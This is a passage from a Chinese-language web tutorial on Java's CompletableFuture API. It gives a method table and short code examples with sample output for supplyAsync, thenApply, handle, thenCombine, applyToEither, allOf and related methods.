        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"..........................3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-none"><code class="language-none">main..........................1
Thread-0：get（begin）
main..........................2
main..........................3
Thread-0：get（done）：0.9293436815770424
Thread-0：complete_action（begin）
0.9293436815770424
Thread-0：complete_action（end）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="CompletableFuture常用API">CompletableFuture常用API</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>API</th>
</tr>
</thead>
<tbody>
<tr>
<td>supplyAsyn</td>
<td>CompletableFuture<u>supplyAsync(Supplier<u>supplier);<br>CompletableFuture<u>supplyAsync(Supplier<u>supplier,Executorexecutor);</u></u></u></u></td>
</tr>
<tr>
<td>then<strong>Apply</strong></td>
<td>CompletableFuture<u>thenApply(<strong>Function</strong>&lt;?superT,?extendsU&gt;fn);</u></td>
</tr>
<tr>
<td><strong>handle</strong></td>
<td>CompletableFuture<u>handle(<strong>BiFunction</strong>&lt;?superT,Throwable,?extendsU&gt;fn)</u></td>
</tr>
<tr>
<td>then<strong>Run</strong></td>
<td>CompletableFuture<void>thenRun(<strong>Runnable</strong>action)</void></td>
</tr>
<tr>
<td>then<strong>Accept</strong></td>
<td>CompletableFuture<void>thenAccept(<strong>Consumer</strong>&lt;?superT&gt;action)</void></td>
</tr>
<tr>
<td>thenCompose</td>
<td>CompletableFuture<u>thenCompose(Function&lt;?superT,?extendsCompletionStage<u>&gt;fn)<br>继续执行下一个CompletableFuture</u></u></td>
</tr>
<tr>
<td>then<strong>Combine</strong></td>
<td>CompletableFuture<v>thenCombine(CompletionStage&lt;?extendsU&gt;other,<strong>BiFunction</strong>&lt;?superT,?superU,?extendsV&gt;fn)<br>两个CompletableFuture的返回结果经过<strong>BiFunction</strong>处理，进入后续操作。</v></td>
</tr>
<tr>
<td>then<strong>Accept</strong>Both</td>
<td>CompletionStage<void>thenAcceptBoth(CompletionStage&lt;?extendsU&gt;other,BiConsumer&lt;?superT,?superU&gt;action)<br>两个CompletableFuture的返回结果经过<strong>BiConsumer</strong>处理，进入后续操作。</void></td>
</tr>
<tr>
<td><strong>run</strong>AfterBoth</td>
<td>CompletableFuture<void>runAfterBoth(CompletionStage&lt;?&gt;other,<strong>Runnable</strong>action)<br>两个CompletableFuture的返回结果经过<strong>Runnable</strong>处理，进入后续操作。</void></td>
</tr>
<tr>
<td><strong>apply</strong>ToEither</td>
<td>CompletionStage<u>applyToEither(CompletionStage&lt;?extendsT&gt;other,<strong>Function</strong>&lt;?superT,U&gt;fn)<br>两个CompletionStage任意一个执行完成即可执行其<strong>Function</strong>。</u></td>
</tr>
<tr>
<td><strong>accept</strong>Either</td>
<td>CompletableFuture<void>acceptEither(CompletionStage&lt;?extendsT&gt;other,<strong>Consumer</strong>&lt;?superT&gt;action)<br>两个CompletionStage任意一个执行完成即可执行其<strong>Consumer</strong></void></td>
</tr>
<tr>
<td><strong>run</strong>AfterEither</td>
<td>CompletableFuture<void>runAfterEither(CompletionStage&lt;?&gt;other,Runnableaction)<br>两个CompletableFuture任意一个执行完成即可执行其<strong>Runnable</strong></void></td>
</tr>
<tr>
<td><strong>allOf</strong></td>
<td>public<strong>static</strong>CompletableFuture<void>allOf(CompletableFuture&lt;?&gt;…cfs)<br>等待所有CompletableFuture执行完成之后，执行后续操作。</void></td>
</tr>
<tr>
<td><strong>anyOf</strong></td>
<td>publicstaticCompletableFuture<object>anyOf(CompletableFuture&lt;?&gt;…cfs)<br>等待任意一个CompletableFuture执行完成之后，执行后续操作</object></td>
</tr>
</tbody>
</table>
<h3 id="supplyAsyn">supplyAsyn</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span>：
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> supplier<span class="token punctuation">)</span><span class="token punctuation">;</span>
举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token constant">API</span>：
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> supplier<span class="token punctuation">,</span>  <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span>
举例：
<span class="token class-name">ExecutorService</span> executor <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
	<span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> 
	thread<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> thread<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">,</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="thenApply">thenApply</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenApply</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">thenApply</span><span class="token punctuation">(</span>v <span class="token operator">-&gt;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="handle">handle</h3>
<p>可以对抛出的异常进行处理</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">Throwable</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="thenRun">thenRun</h3>
<p>执行完成之后的其他操作。无入参。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenRun</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span>

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">thenRun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="thenAccept">thenAccept</h3>
<p>返回结果V的后续消费</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAccept</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span>

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">thenAccept</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="thenCompose">thenCompose</h3>
<p>继续执行下一个CompletableFuture</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenCompose</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">CompletionStage</span><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>

其中：<span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">CompletionStage</span><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> fn是另外一个<span class="token class-name">CompletableFuture</span>。

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">thenCompose</span><span class="token punctuation">(</span>v <span class="token operator">-&gt;</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> v <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="thenCombine">thenCombine</h3>
<p>两个CompletableFuture的返回结果经过BiFunction处理，进入后续操作。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenCombine</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span>
        <span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span> 

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">thenCombine</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> v1 <span class="token operator">+</span> v2<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="thenAcceptBoth">thenAcceptBoth</h3>
<p>两个CompletableFuture的返回结果经过BiConsumer处理，进入后续消费。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAcceptBoth</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span>
        <span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span> 

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">thenAcceptBoth</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

输出：
<span class="token number">1</span>
<span class="token number">2</span>
<span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="runAfterBoth">runAfterBoth</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterBoth</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span> <span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="applyToEither">applyToEither</h3>
<p>两个CompletionStage 任意一个执行完成即可执行其Function。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">applyToEither</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span>
         <span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">applyToEither</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v <span class="token operator">-&gt;</span> v <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
输出：
<span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="acceptEither">acceptEither</h3>
<p>两个CompletionStage 任意一个执行完成即可执行其Consumer</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">acceptEither</span><span class="token punctuation">(</span>
        <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span> <span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span>

举例：
<span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">acceptEither</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
输出：
<span class="token number">1</span>
<span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="runAfterEither">runAfterEither</h3>
<p>两个CompletionStage 任意一个执行完成即可执行其Runnable。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAfterEither</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span>
                                                  <span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="allOf">allOf</h3>
<p>等待所有CompletableFuture执行完成之后，执行后续的操作</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">API</span><span class="token operator">:</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">allOf</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> cfs<span class="token punctuation">)</span>

举例：
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">&lt;</span><span class="token class-name">Double</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> collect <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

